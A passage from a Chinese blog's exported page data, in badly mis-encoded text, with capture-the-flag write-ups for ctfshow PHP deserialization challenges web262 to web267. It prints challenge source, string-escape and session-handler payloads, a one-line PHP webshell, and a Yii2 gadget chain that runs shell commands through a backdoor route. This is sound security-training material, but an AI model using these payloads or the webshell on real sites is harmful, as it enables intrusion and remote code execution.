\u0026#39;Your message has been sent\u0026#39;; 38} 39 40highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13highlight_file(__FILE__); 14include(\u0026#39;flag.php\u0026#39;); 15 16class message{ 17 public $from; 18 public $msg; 19 public $to; 20 public $token=\u0026#39;user\u0026#39;; 21 public function __construct($f,$m,$t){ 22 $this-\u0026gt;from = $f; 23 $this-\u0026gt;msg = $m; 24 $this-\u0026gt;to = $t; 25 } 26} 27 28if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 29 $msg = unserialize(base64_decode($_COOKIE[\u0026#39;msg\u0026#39;])); 30 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 31 echo $flag; 32 } 33} æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æƒ³åŠæ³•è®©tokenç­‰äºadmin\nä¿¡æ¯ä¼ è¾“çš„è¿‡ç¨‹ä¸­ä½¿ç”¨çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå­˜åœ¨å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé€šè¿‡é€ƒé€¸æˆ‘ä»¬å¯ä»¥ä½¿token=admin\nä¹‹å‰å†™è¿‡æˆ‘å°±æ‡’å¾—é‡æ–°å†™äº†\nhttps://ctf.show/writeups/706838\né¦–å…ˆå…ˆç”Ÿæˆä¸€æ®µåºåˆ—\n1\u0026lt;?php 2class message{ 3 public $from; 4 public $msg; 5 public $to = \u0026#39;123\u0026#39;; 6 public $token=\u0026#39;admin\u0026#39;; 7 8} 9$payload = new message(); 10echo serialize($payload); 11 12O:7:\u0026#34;message\u0026#34;:4:{s:4:\u0026#34;from\u0026#34;;N;s:3:\u0026#34;msg\u0026#34;;N;s:2:\u0026#34;to\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} æˆªå–åé¢ä¸€éƒ¨åˆ†ä½œä¸ºtoçš„å€¼ä¼ å…¥\npayload:\n?f=\u0026amp;m=\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} web263 è®¿é—®/www.zipæ‹¿åˆ°æºç \nå®¡è®¡ä»£ç æˆ‘ä»¬å¯ä»¥åœ¨/inc/inc.phpä¸­æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå±é™©æ–¹æ³•\nå‡å¦‚usernameå’Œpasswordå¯æ§ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å…¥æœ¨é©¬\nä½†æ˜¯è¿™æ˜¯ä¸€ä¸ª__destructæ–¹æ³•ï¼Œæƒ³è¦è§¦å‘å¿…é¡»è¦ç»è¿‡ååºåˆ—åŒ–ï¼Œé‚£è¿™é“é¢˜å“ªé‡Œæœ‰è¿›è¡Œååºåˆ—çš„åœ°æ–¹å‘¢\næ–‡ç«  - å¸¦ä½ èµ°è¿›PHP sessionååºåˆ—åŒ–æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº\nè¿™ç¯‡æ–‡ç« è®²å¾—å¾ˆè¯¦ç»†\nå½’æ ¹ç»“åº•è¿™ä¸ªæ¼æ´ä¹‹æ‰€ä»¥å­˜åœ¨æ˜¯ç”±äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒé€ æˆçš„\nsession.serialize_handlerå®šä¹‰çš„å¼•æ“æœ‰ä¸‰ç§ï¼Œå¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\nå¤„ç†å™¨åç§° å­˜å‚¨æ ¼å¼ php é”®å + ç«–çº¿ + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php_serialize ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„ æ³¨ï¼šè‡ª PHP 5.5.4 èµ·å¯ä»¥ä½¿ç”¨ php_serialize\nè¿™é“é¢˜çš„phpç‰ˆæœ¬ä¸º7.3.11ï¼Œé»˜è®¤ä½¿ç”¨çš„å¤„ç†å™¨ä¸ºphp_serialize\nè€Œåœ¨/inc/inc.phpä¸­å´è®¾ç½®å¤„ç†å™¨ä¸ºphp\nä¹Ÿå°±æ˜¯è¯´åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒ\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®phpå¤„ç†å™¨çš„æ ¼å¼æ„é€ å‡ºpayload\nexpï¼š\n1\u0026lt;?php 2 3class User{ 4 public $username; 5 public $password; 6 function __construct(){ 7 $this-\u0026gt;username = \u0026#39;1.php\u0026#39;; 8 $this-\u0026gt;password = \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;; 9 } 10} 11 12echo urlencode(base64_encode(\u0026#39;|\u0026#39;.serialize(new User()))); 13 14?\u0026gt; æˆ‘ä»¬å°†cookieä¸­çš„limitä¿®æ”¹ä¸ºæˆ‘ä»¬åºåˆ—åŒ–åçš„ç»“æœ\n/index.php\n1\tif(isset($_SESSION[\u0026#39;limit\u0026#39;])){ 2\t$_SESSION[\u0026#39;limti\u0026#39;]\u0026gt;5?die(\u0026#34;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶\u0026#34;):$_SESSION[\u0026#39;limit\u0026#39;]=base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]); 3\t$_COOKIE[\u0026#39;limit\u0026#39;] = base64_encode(base64_decode($_COOKIE[\u0026#39;limit\u0026#39;]) +1); 4\t}else{ 5\tsetcookie(\u0026#34;limit\u0026#34;,base64_encode(\u0026#39;1\u0026#39;)); 6\t$_SESSION[\u0026#39;limit\u0026#39;]= 1; 7\t} ä¿®æ”¹åè®¿é—®/check.phpè¿›è¡Œååºåˆ—åŒ–\næœ€åè®¿é—®/log-1.php\næˆåŠŸå†™å…¥\nweb264 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17session_start(); 18 19class message{ 20 public $from; 21 public $msg; 22 public $to;1 23 public function __construct($f,$m,$t){ 24 $this-\u0026gt;from = $f; 25 $this-\u0026gt;msg = $m; 26 $this-\u0026gt;to = $t; 27 } 28} 29 30$f = $_GET[\u0026#39;f\u0026#39;]; 31$m = $_GET[\u0026#39;m\u0026#39;]; 32$t = $_GET[\u0026#39;t\u0026#39;]; 33 34if(isset($f) \u0026amp;\u0026amp; isset($m) \u0026amp;\u0026amp; isset($t)){ 35 $msg = new message($f,$m,$t); 36 $umsg = str_replace(\u0026#39;fuck\u0026#39;, \u0026#39;loveU\u0026#39;, serialize($msg)); 37 $_SESSION[\u0026#39;msg\u0026#39;]=base64_encode($umsg); 38 echo \u0026#39;Your message has been sent\u0026#39;; 39} 40 41highlight_file(__FILE__); message.php\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13session_start(); 14highlight_file(__FILE__); 15include(\u0026#39;flag.php\u0026#39;); 16 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token=\u0026#39;user\u0026#39;; 22 public function __construct($f,$m,$t){ 23 $this-\u0026gt;from = $f; 24 $this-\u0026gt;msg = $m; 25 $this-\u0026gt;to = $t; 26 } 27} 28 29if(isset($_COOKIE[\u0026#39;msg\u0026#39;])){ 30 $msg = unserialize(base64_decode($_SESSION[\u0026#39;msg\u0026#39;])); 31 if($msg-\u0026gt;token==\u0026#39;admin\u0026#39;){ 32 echo $flag; 33 } 34} è¿™é¢˜æ˜¯ä¿®å¤äº†web262çš„éé¢„æœŸè§£ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç›´æ¥åœ¨message.phpä¿®æ”¹cookieè¿›è¡Œååºåˆ—åŒ–\næ‰€ä»¥è§£æ³•åŒweb262\npayload:\n?f=1\u0026amp;m=1\u0026amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\u0026#34;;s:5:\u0026#34;token\u0026#34;;s:5:\u0026#34;admin\u0026#34;;} æ³¨æ„è¦åœ¨message.phpçš„cookieä¸­åŠ ä¸Šmsg=1\nweb265 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#39;flag.php\u0026#39;); 16highlight_file(__FILE__); 17class ctfshowAdmin{ 18 public $token; 19 public $password; 20 21 public function __construct($t,$p){ 22 $this-\u0026gt;token=$t; 23 $this-\u0026gt;password = $p; 24 } 25 public function login(){ 26 return $this-\u0026gt;token===$this-\u0026gt;password; 27 } 28} 29 30$ctfshow = unserialize($_GET[\u0026#39;ctfshow\u0026#39;]); 31$ctfshow-\u0026gt;token=md5(mt_rand()); 32 33if($ctfshow-\u0026gt;login()){ 34 echo $flag; 35} è¿™é¢˜æŒ‡é’ˆå¼•ç”¨ä½¿passwordæ’ç­‰äºtokenå³å¯\nexp\n1\u0026lt;?php 2 class ctfshowAdmin{ 3 public $token; 4 public $password; 5 6 public function __construct($t,$p){ 7 $this-\u0026gt;token=$t; 8 $this-\u0026gt;password = $p; 9 } 10 } 11 $a = new ctfshowAdmin(\u0026#34;æˆ‘èƒ½æ‰“ä¸Šæµ·major\u0026#34;,\u0026#34;å…¨åœºæ¬¢å‘¼ï¼DANKINGï¼DANKINGï¼\u0026#34;); 12 $a-\u0026gt;password = \u0026amp;$a-\u0026gt;token; 13 echo urlencode(serialize($a)); web266 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14highlight_file(__FILE__); 15 16include(\u0026#39;flag.php\u0026#39;); 17$cs = file_get_contents(\u0026#39;php://input\u0026#39;); 18 19 20class ctfshow{ 21 public $username=\u0026#39;xxxxxx\u0026#39;; 22 public $password=\u0026#39;xxxxxx\u0026#39;; 23 public function __construct($u,$p){ 24 $this-\u0026gt;username=$u; 25 $this-\u0026gt;password=$p; 26 } 27 public function login(){ 28 return $this-\u0026gt;username===$this-\u0026gt;password; 29 } 30 public function __toString(){ 31 return $this-\u0026gt;username; 32 } 33 public function __destruct(){ 34 global $flag; 35 echo $flag; 36 } 37} 38$ctfshowo=@unserialize($cs); 39if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $cs)){ 40 throw new Exception(\u0026#34;Error $ctfshowo\u0026#34;,1); 41} phpå¤§å°å†™ä¸æ•æ„Ÿï¼Œå¤§å°å†™ç»•è¿‡\nexp\n1\u0026lt;?php 2class Ctfshow{ 3 4} 5echo serialize(new Ctfshow()); O:7:\u0026#34;Ctfshow\u0026#34;:0:{} web267 è€ƒç‚¹ï¼šYii2 ååºåˆ—åŒ–æ¼æ´\næœ‰ä¸€ä¸ªç™»å½•å…¥å£\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin\nåœ¨/index.php?r=site%2Faboutå¤„æŸ¥çœ‹æºä»£ç çœ‹åˆ°hint\nè®¿é—®/index.php?r=site%2Fabout\u0026amp;view-source\né¢˜ç›®ç»™å‡ºäº†å…¥å£ç‚¹\nä»æºç ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é“é¢˜ç”¨çš„æ˜¯yiiæ¡†æ¶ï¼Œè€Œä¸”ä¸º2.0ç‰ˆæœ¬\nyiiååºåˆ—åŒ–æ¼æ´å¤ç°åŠåˆ©ç”¨_yiiæ¡†æ¶æ¼æ´-CSDNåšå®¢\nç›´æ¥ç”¨pocæ€»æ„Ÿè§‰ç¼ºäº†ç‚¹ä»€ä¹ˆï¼Œé‚£è‡ªå·±æ“ä¸€æ“å§ï¼Œä½†æ˜¯è¿‡ç¨‹å°±ä¸æ”¾åœ¨è¿™é‡Œäº†\n\u0026lt;?php\rnamespace yii\\rest{\rclass IndexAction{\rpublic $checkAccess;\rpublic $id;\rpublic function __construct(){\r$this-\u0026gt;checkAccess = \u0026#39;shell_exec\u0026#39;;\r$this-\u0026gt;id = \u0026#39;cat /flag | tee 1\u0026#39;;//å‘½ä»¤æ‰§è¡Œ\r}\r}\r}\rnamespace Faker {\ruse yii\\rest\\IndexAction;\rclass Generator\r{\rprotected $formatters;\rpublic function __construct()\r{\r$this-\u0026gt;formatters[\u0026#39;close\u0026#39;] = [new IndexAction(), \u0026#39;run\u0026#39;];\r}\r}\r}\rnamespace yii\\db{\ruse Faker\\Generator;\rclass BatchQueryResult{\rprivate $_dataReader;\rpublic function __construct()\r{\r$this-\u0026gt;_dataReader=new Generator();\r}\r}\r}\rnamespace{\ruse yii\\db\\BatchQueryResult;\recho base64_encode(serialize(new BatchQueryResult()));\r} æ²¡å›æ˜¾ï¼Œç”¨teeå°†è¾“å‡ºå¤åˆ¶åˆ°1æ–‡ä»¶ä¸­\npayload\n?r=backdoor/shell\u0026amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV\rJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV\rxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID\rEiO31pOjE7czozOiJydW4iO319fX0= ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","summary":"\u003ch4 id=\"phpçš„é­”æ³•æ–¹æ³•\"\u003ePHPçš„é­”æ³•æ–¹æ³•\u003c/h4\u003e\n\u003cp\u003ePHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚æ‰€ä»¥åœ¨å®šä¹‰ç±»æ–¹æ³•æ—¶ï¼Œé™¤äº†ä¸Šè¿°é­”æœ¯æ–¹æ³•ï¼Œå»ºè®®ä¸è¦ä»¥ __ ä¸ºå‰ç¼€ã€‚ å¸¸è§çš„é­”æ³•æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-scss\" data-lang=\"scss\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__construct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eç±»çš„æ„é€ å‡½æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__destruct\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eç±»çš„ææ„å‡½æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__call\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__callStatic\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__get\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eæˆ–empty\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ—¶è¢«è°ƒç”¨\u003c/span\u003e\u003cspan class=\"err\"\u003eã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__sleep\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ‰§è¡Œserialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ—¶\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__wakeup\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ‰§è¡Œunserialize\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ—¶\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__toString\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__invoke\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__set_state\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eè°ƒç”¨var_export\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003eå¯¼å‡ºç±»æ—¶\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨\u003c/span\u003e\u003cspan class=\"err\"\u003eã€‚\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__clone\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__autoload\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e__debugInfo\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"err\"\u003eï¼Œ\u003c/span\u003e\u003cspan class=\"nt\"\u003eæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"web254\"\u003eweb254\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e3\u003c/span\u003e\u003cspan class=\"cl\"\u003e                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           